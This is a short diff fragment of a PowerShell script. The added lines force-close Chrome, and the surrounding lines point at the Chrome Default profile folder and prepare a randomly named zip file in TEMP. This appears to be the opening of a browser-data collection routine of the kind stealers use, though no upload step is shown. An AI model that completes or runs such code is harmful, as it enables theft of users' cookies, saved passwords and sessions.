@@ -1,3 +1,5 @@
+Get-Process "chrome" | Stop-Process -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 1
 $chromeUserDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
 $randomName = [System.IO.Path]::GetRandomFileName().Split('.')[0]
 $destinationPath = "$env:TEMP\$randomName.zip"
